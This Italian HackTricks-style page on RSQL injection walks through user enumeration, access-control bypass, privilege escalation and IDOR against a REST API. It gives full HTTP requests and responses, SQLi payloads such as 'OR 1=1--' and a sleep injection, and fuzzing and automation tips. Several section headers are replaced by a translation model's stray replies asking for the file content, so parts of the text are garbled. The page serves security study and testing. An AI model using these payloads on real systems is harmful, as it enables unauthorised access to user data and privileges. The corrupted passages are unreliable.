# RSQL Injection

{{#include ../banners/hacktricks-training.md}}

## Cos'è RSQL?
RSQL è un linguaggio di query progettato per il filtraggio parametrizzato degli input nelle RESTful APIs. Basato su FIQL (Feed Item Query Language), originariamente specificato da Mark Nottingham per interrogare i feed Atom, RSQL si distingue per la sua semplicità e per la capacità di esprimere query complesse in modo compatto e conforme agli URI su HTTP. Questo lo rende un'ottima scelta come linguaggio di query generale per la ricerca di endpoint REST.

## Panoramica
RSQL Injection è una vulnerabilità nelle applicazioni web che utilizzano RSQL come linguaggio di query nelle RESTful APIs. Simile a [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection) e [LDAP Injection](https://owasp.org/www-community/attacks/LDAP_Injection), questa vulnerabilità si verifica quando i filtri RSQL non sono correttamente sanificati, permettendo a un attaccante di iniettare query malevole per accedere, modificare o cancellare dati senza autorizzazione.

## Come funziona?
RSQL permette di costruire query avanzate nelle RESTful APIs, per esempio:
```bash
/products?filter=price>100;category==electronics
```
Questo si traduce in una query strutturata che filtra i prodotti con prezzo maggiore di 100 e categoria “electronics”.

Se l'applicazione non valida correttamente l'input dell'utente, un attacker potrebbe manipolare il filtro per eseguire query inaspettate, come:
```bash
/products?filter=id=in=(1,2,3);delete_all==true
```
O perfino sfruttarlo per estrarre informazioni sensibili con query booleane o subquery annidate.

## Rischi
- **Esposizione di dati sensibili:** Un attaccante può recuperare informazioni che non dovrebbero essere accessibili.
- **Modifica o cancellazione dei dati:** Iniezione di filtri che alterano i record del database.
- **Escalation di privilegi:** Manipolazione degli identificatori che concedono ruoli tramite filtri per ingannare l'applicazione e accedere con i privilegi di altri utenti.
- **Evasione dei controlli di accesso:** Manipolazione dei filtri per accedere a dati riservati.
- **Impersonificazione o IDOR:** Modifica degli identificatori tra utenti tramite filtri che permettono l'accesso a informazioni e risorse di altri utenti senza essere autenticati correttamente come tali.

## Operatori RSQL supportati
| Operatore  | Descrizione | Esempio  |
|:----: |:----: |:------------------:|
| `;` / `and` | Operatore logico **AND**. Filtra le righe dove *entrambe* le condizioni sono *vere* | `/api/v2/myTable?q=columnA==valueA;columnB==valueB` |
| `,` / `or` | Operatore logico **OR**. Filtra le righe dove *almeno una* condizione è *vera*| `/api/v2/myTable?q=columnA==valueA,columnB==valueB` |
| `==` | Esegue una query di **uguaglianza**. Restituisce tutte le righe da *myTable* dove i valori in *columnA* sono esattamente uguali a *queryValue* | `/api/v2/myTable?q=columnA==queryValue` |
| `=q=` | Esegue una query di **ricerca**. Restituisce tutte le righe da *myTable* dove i valori in *columnA* contengono *queryValue* | `/api/v2/myTable?q=columnA=q=queryValue` |
| `=like=` | Esegue una query di tipo **like**. Restituisce tutte le righe da *myTable* dove i valori in *columnA* sono simili a *queryValue* | `/api/v2/myTable?q=columnA=like=queryValue` |
| `=in=` | Esegue una query **in**. Restituisce tutte le righe da *myTable* dove *columnA* contiene *valueA* O *valueB* | `/api/v2/myTable?q=columnA=in=(valueA, valueB)` |
| `=out=` | Esegue una query di **esclusione**. Restituisce tutte le righe di *myTable* dove i valori in *columnA* non sono né *valueA* né *valueB* | `/api/v2/myTable?q=columnA=out=(valueA,valueB)` |
| `!=` | Esegue una query *diverso da*. Restituisce tutte le righe da *myTable* dove i valori in *columnA* non sono uguali a *queryValue* | `/api/v2/myTable?q=columnA!=queryValue` |
| `=notlike=` | Esegue una query **not like**. Restituisce tutte le righe da *myTable* dove i valori in *columnA* non sono simili a *queryValue* | `/api/v2/myTable?q=columnA=notlike=queryValue` |
| `<` & `=lt=` | Esegue una query **minore di**. Restituisce tutte le righe da *myTable* dove i valori in *columnA* sono minori di *queryValue* | `/api/v2/myTable?q=columnA<queryValue` <br> `/api/v2/myTable?q=columnA=lt=queryValue` |
| `=le=` & `<=` | Esegue una query **minore o uguale a**. Restituisce tutte le righe da *myTable* dove i valori in *columnA* sono minori o uguali a *queryValue* | `/api/v2/myTable?q=columnA<=queryValue` <br> `/api/v2/myTable?q=columnA=le=queryValue` |
| `>` & `=gt=` | Esegue una query **maggiore di**. Restituisce tutte le righe da *myTable* dove i valori in *columnA* sono maggiori di *queryValue* | `/api/v2/myTable?q=columnA>queryValue` <br> `/api/v2/myTable?q=columnA=gt=queryValue` |
| `>=` & `=ge=` | Esegue una query **uguale o maggiore di**. Restituisce tutte le righe da *myTable* dove i valori in *columnA* sono uguali o maggiori di *queryValue* | `/api/v2/myTable?q=columnA>=queryValue` <br> `/api/v2/myTable?q=columnA=ge=queryValue` |
| `=rng=` | Esegue una query **da a**. Restituisce tutte le righe da *myTable* dove i valori in *columnA* sono uguali o maggiori di *fromValue*, e minori o uguali a *toValue* | `/api/v2/myTable?q=columnA=rng=(fromValue,toValue)` |

**Nota**: Tabella basata su informazioni da [**MOLGENIS**](https://molgenis.gitbooks.io/molgenis/content/) e [**rsql-parser**](https://github.com/jirutka/rsql-parser) applications.

#### Esempi
- name=="Kill Bill";year=gt=2003
- name=="Kill Bill" and year>2003
- genres=in=(sci-fi,action);(director=='Christopher Nolan',actor==*Bale);year=ge=2000
- genres=in=(sci-fi,action) and (director=='Christopher Nolan' or actor==*Bale) and year>=2000
- director.lastName==Nolan;year=ge=2000;year=lt=2010
- director.lastName==Nolan and year>=2000 and year<2010
- genres=in=(sci-fi,action);genres=out=(romance,animated,horror),director==Que*Tarantino
- genres=in=(sci-fi,action) and genres=out=(romance,animated,horror) or director==Que*Tarantino

**Nota**: Tabella basata su informazioni da [**rsql-parser**](https://github.com/jirutka/rsql-parser) application.

## Filtri comuni
Questi filtri aiutano a raffinare le query nelle API:

| Filtro | Descrizione | Esempio |
|--------|------------|---------|
| `filter[users]` | Filtra i risultati per utenti specifici | `/api/v2/myTable?filter[users]=123` |
| `filter[status]` | Filtra per stato (active/inactive, completed, ecc.) | `/api/v2/orders?filter[status]=active` |
| `filter[date]` | Filtra i risultati entro un intervallo di date | `/api/v2/logs?filter[date]=gte:2024-01-01` |
| `filter[category]` | Filtra per categoria o tipo di risorsa | `/api/v2/products?filter[category]=electronics` |
| `filter[id]` | Filtra per identificatore univoco | `/api/v2/posts?filter[id]=42` |

## Parametri comuni
Questi parametri aiutano a ottimizzare le risposte delle API:

| Parametro | Descrizione | Esempio |
|-----------|------------|---------|
| `include` | Include risorse correlate nella risposta | `/api/v2/orders?include=customer,items` |
| `sort` | Ordina i risultati in ordine ascendente o discendente | `/api/v2/users?sort=-created_at` |
| `page[size]` | Controlla il numero di risultati per pagina | `/api/v2/products?page[size]=10` |
| `page[number]` | Specifica il numero di pagina | `/api/v2/products?page[number]=2` |
| `fields[resource]` | Definisce quali campi ritornare nella risposta | `/api/v2/users?fields[users]=id,name,email` |
| `search` | Esegue una ricerca più flessibile | `/api/v2/posts?search=technology` |

## Perdita di informazioni e enumerazione degli utenti
La seguente richiesta mostra un endpoint di registrazione che richiede il parametro email per verificare se esiste un utente registrato con quell'email e restituire true o false a seconda che esista o meno nel database:
### Richiesta
```
GET /api/registrations HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
Per favore incolla il contenuto di src/pentesting-web/rsql-injection.md che desideri venga tradotto in italiano.
```
HTTP/1.1 400
Date: Sat, 22 Mar 2025 14:47:14 GMT
Content-Type: application/vnd.api+json
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *
Content-Length: 85

{
"errors": [{
"code": "BLANK",
"detail": "Missing required param: email",
"status": "400"
}]
}
```
Sebbene sia previsto `/api/registrations?email=<emailAccount>`, è possibile usare filtri RSQL per tentare di enumerate e/o extract informazioni sugli utenti tramite l'uso di operatori speciali:
### Richiesta
```
GET /api/registrations?filter[userAccounts]=email=='test@test.com' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Origin: https://locahost:3000
Connection: keep-alive
Referer: https://locahost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
### Risposta
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 14:09:38 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 38
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": {
"attributes": {
"tenants": []
}
}
}
```
Nel caso di corrispondenza di un account email valido, l'applicazione restituirebbe le informazioni dell'utente invece del classico *“true”*, *"1"* o qualsiasi altra cosa nella risposta al server:
### Request
```
GET /api/registrations?filter[userAccounts]=email=='manuel**********@domain.local' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
Non vedo il contenuto da tradurre. Per favore incolla il testo di src/pentesting-web/rsql-injection.md qui (mantieni anche eventuali tag/links come appaiono) e procederò con la traduzione in italiano.
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 14:19:46 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 293
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": {
"id": "********************",
"type": "UserAccountDTO",
"attributes": {
"id": "********************",
"type": "UserAccountDTO",
"email": "manuel**********@domain.local",
"sub": "*********************",
"status": "ACTIVE",
"tenants": [{
"id": "1"
}]
}
}
}
```
## Authorization evasion
In questo scenario, partiamo da un utente con un ruolo base e in cui non abbiamo permessi privilegiati (es. amministratore) per accedere alla lista di tutti gli utenti registrati nel database:
### Richiesta
```
GET /api/users HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJhb.................
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
Non ho accesso al file src/pentesting-web/rsql-injection.md. Per favore incolla qui il contenuto (o la porzione che vuoi tradurre). Tradurrò il testo rilevante in italiano mantenendo intatti codice, tag, link, percorsi e termini specificati.
```
HTTP/1.1 403
Date: Sat, 22 Mar 2025 14:40:07 GMT
Content-Length: 0
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *
```
Ancora una volta facciamo uso dei filters e dei special operators che ci permetteranno un modo alternativo per ottenere le informazioni degli users e aggirare l'access control.
Per esempio, filtra quegli *users* che contengono la lettera “*a*” nel loro user *ID*:
### Richiesta
```
GET /api/users?filter[users]=id=in=(*a*) HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJhb.................
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
Non vedo il contenuto da tradurre. Per favore incolla il testo di src/pentesting-web/rsql-injection.md (incluso il markdown) e provvederò a tradurlo in italiano seguendo le regole indicate.
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 14:43:28 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 1434192
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": [{
"id": "********A***********",
"type": "UserGetResponseCustomDTO",
"attributes": {
"status": "ACTIVE",
"countryId": 63,
"timeZoneId": 3,
"translationKey": "************",
"email": "**********@domain.local",
"firstName": "rafael",
"surname": "************",
"telephoneCountryCode": "**",
"mobilePhone": "*********",
"taxIdentifier": "********",
"languageId": 1,
"createdAt": "2024-08-09T10:57:41.237Z",
"termsOfUseAccepted": true,
"id": "******************",
"type": "UserGetResponseCustomDTO"
}
}, {
"id": "*A*******A*****A*******A******",
"type": "UserGetResponseCustomDTO",
"attributes": {
"status": "ACTIVE",
"countryId": 63,
"timeZoneId": 3,
"translationKey": ""************",
"email": "juan*******@domain.local",
"firstName": "juan",
"surname": ""************",",
"telephoneCountryCode": "**",
"mobilePhone": "************",
"taxIdentifier": "************",
"languageId": 1,
"createdAt": "2024-07-18T06:07:37.68Z",
"termsOfUseAccepted": true,
"id": "*******************",
"type": "UserGetResponseCustomDTO"
}
}, {
................
```
## Privilege Escalation
È molto probabile trovare determinati endpoint che verificano i privilegi dell'utente in base al ruolo. Ad esempio, abbiamo un utente che non ha privilegi:
### Request
```
GET /api/companyUsers?include=role HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJhb......
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
Non hai fornito il contenuto da tradurre. Per favore incolla il testo del file src/pentesting-web/rsql-injection.md (inclusi i blocchi markdown) e lo tradurrò in italiano rispettando le regole indicate.
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 19:13:08 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 11
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": []
}
```
Utilizzando alcuni operatori potevamo enumerare gli utenti amministratori:
### Richiesta
```
GET /api/companyUsers?include=role&filter[companyUsers]=user.id=='94****************************' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJh.....
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
### Risposta
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 19:13:45 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 361
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": [{
"type": "CompanyUserGetResponseDTO",
"attributes": {
"companyId": "FA**************",
"companyTaxIdentifier": "B999*******",
"bizName": "company sl",
"email": "jose*******@domain.local",
"userRole": {
"userRoleId": 1,
"userRoleKey": "general.roles.admin"
},
"companyCountryTranslationKey": "*******",
"type": "CompanyUserGetResponseDTO"
}
}]
}
```
Dopo aver conosciuto l'identificatore di un utente amministratore, sarebbe possibile sfruttare un'escalation di privilegi sostituendo o aggiungendo il filtro corrispondente con l'identificatore dell'amministratore e ottenendo gli stessi privilegi:
### Request
```
GET /api/functionalities/allPermissionsFunctionalities?filter[companyUsers]=user.id=='94****************************' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJ.....
Origin: https:/localhost:3000
Connection: keep-alive
Referer: https:/localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
### Risposta
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 18:53:00 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 68833
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"meta": {
"Functionalities": [{
"functionalityId": 1,
"permissionId": 1,
"effectivePriority": "PERMIT",
"effectiveBehavior": "PERMIT",
"translationKey": "general.userProfile",
"type": "FunctionalityPermissionDTO"
}, {
"functionalityId": 2,
"permissionId": 2,
"effectivePriority": "PERMIT",
"effectiveBehavior": "PERMIT",
"translationKey": "general.my_profile",
"type": "FunctionalityPermissionDTO"
}, {
"functionalityId": 3,
"permissionId": 3,
"effectivePriority": "PERMIT",
"effectiveBehavior": "PERMIT",
"translationKey": "layout.change_user_data",
"type": "FunctionalityPermissionDTO"
}, {
"functionalityId": 4,
"permissionId": 4,
"effectivePriority": "PERMIT",
"effectiveBehavior": "PERMIT",
"translationKey": "general.configuration",
"type": "FunctionalityPermissionDTO"
}, {
....
}]
}
}
```
## Impersonate or Insecure Direct Object References (IDOR)
Oltre all'uso del parametro `filter`, è possibile utilizzare altri parametri come `include` che permettono di includere nel risultato determinati campi (es. lingua, paese, password...).

Nell'esempio seguente sono mostrate le informazioni del profilo utente:
### Richiesta
```
GET /api/users?include=language,country HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJ...
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
Non hai fornito il contenuto da tradurre. Per favore incolla il testo di src/pentesting-web/rsql-injection.md (o indica il passaggio specifico) e lo tradurrò in italiano rispettando le regole fornite.
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 19:47:27 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 540
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": [{
"id": "D5********************",
"type": "UserGetResponseCustomDTO",
"attributes": {
"status": "ACTIVE",
"countryId": 63,
"timeZoneId": 3,
"translationKey": "**********",
"email": "domingo....@domain.local",
"firstName": "Domingo",
"surname": "**********",
"telephoneCountryCode": "**",
"mobilePhone": "******",
"languageId": 1,
"createdAt": "2024-03-11T07:24:57.627Z",
"termsOfUseAccepted": true,
"howMeetUs": "**************",
"id": "D5********************",
"type": "UserGetResponseCustomDTO"
}
}]
}
```
La combinazione di filtri può essere usata per eludere i controlli di autorizzazione e ottenere accesso ai profili di altri utenti:
### Request
```
GET /api/users?include=language,country&filter[users]=id=='94***************' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJ...
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
Non vedo il contenuto del file. Per favore incolla il contenuto di src/pentesting-web/rsql-injection.md che vuoi tradurre e applicherò le regole fornite.
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 19:50:07 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 520
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": [{
"id": "94******************",
"type": "UserGetResponseCustomDTO",
"attributes": {
"status": "ACTIVE",
"countryId": 63,
"timeZoneId": 2,
"translationKey": "**************",
"email": "jose******@domain.local",
"firstName": "jose",
"surname": "***************",
"telephoneCountryCode": "**",
"mobilePhone": "********",
"taxIdentifier": "*********",
"languageId": 1,
"createdAt": "2024-11-21T08:29:05.833Z",
"termsOfUseAccepted": true,
"id": "94******************",
"type": "UserGetResponseCustomDTO"
}
}]
}
```
## Rilevamento & fuzzing — consigli rapidi
- Verifica il supporto RSQL inviando probe innocui come `?filter=id==test`, `?q==test` o operatori malformati `=foo=`; le API verbose spesso leakano errori del parser ("Unknown operator" / "Unknown property").
- Molte implementazioni parsano due volte i parametri URL; prova a doppia-encodare `(`, `)`, `*`, `;` (es., `%2528admin%2529`) per bypassare blocklist naive e WAFs.
- Boolean exfil con wildcard: `filter[users]=email==*%@example.com;status==ACTIVE` e inverti la logica con `,` (OR) per confrontare le dimensioni delle risposte.
- Range/proximity leaks: `filter[users]=createdAt=rng=(2024-01-01,2025-01-01)` consente di enumerare rapidamente per anno senza conoscere gli ID esatti.

## Abusi specifici del framework (Elide / JPA Specification / JSON:API)
- Elide e molti progetti Spring Data REST traducono RSQL direttamente in JPA Criteria. Se gli sviluppatori aggiungono operatori personalizzati (es., `=ilike=`) e costruiscono predicati concatenando stringhe invece di usare parametri preparati, puoi arrivare a SQLi (payload classico: `name=ilike='%%' OR 1=1--'`).
- Elide analytic data store accetta colonne parametrizzate; combinare parametri analitici controllati dall'utente con filtri RSQL è stata la causa principale di SQLi in CVE-2022-24827. Anche se le versioni patchate parametrizzano correttamente, codice bespoke simile spesso rimane—cerca espressioni SpEL in `@JoinFilter`/`@ReadPermission` che contengano `${}` e prova a iniettare `';sleep(5);'` o tautologie logiche.
- I backend JSON:API espongono comunemente sia `include` che `filter`. Filtrare su risorse correlate `filter[orders]=customer.email==*admin*` può bypassare gli ACL di livello superiore perché i filtri a livello di relazione vengono eseguiti prima dei controlli di ownership.

## Strumenti di automazione
- **rsql-parser CLI (Java)**: `java -jar rsql-parser.jar "name=='*admin*';status==ACTIVE"` valida i payload localmente e mostra l'albero della sintassi astratta—utile per costruire parentesi bilanciate e operatori personalizzati.
- **Builder Python rapido**:
```python
from pyrsql import RSQL
payload = RSQL().and_("email==*admin*", "status==ACTIVE").or_("role=in=(owner,admin)")
print(str(payload))
```
- Abbinalo a un HTTP fuzzer (ffuf, turbo-intruder) iterando le posizioni wildcard `*a*`, `*e*`, ecc., all'interno delle liste `=in=` per enumerare rapidamente IDs e emails.

## Riferimenti
- [RSQL Injection](https://owasp.org/www-community/attacks/RSQL_Injection)
- [RSQL Injection Exploitation](https://m3n0sd0n4ld.github.io/patoHackventuras/rsql_injection_exploitation)
- [Elide filtering & security considerations](https://elide.io/pages/guide/03-analytics.html)

{{#include ../banners/hacktricks-training.md}}
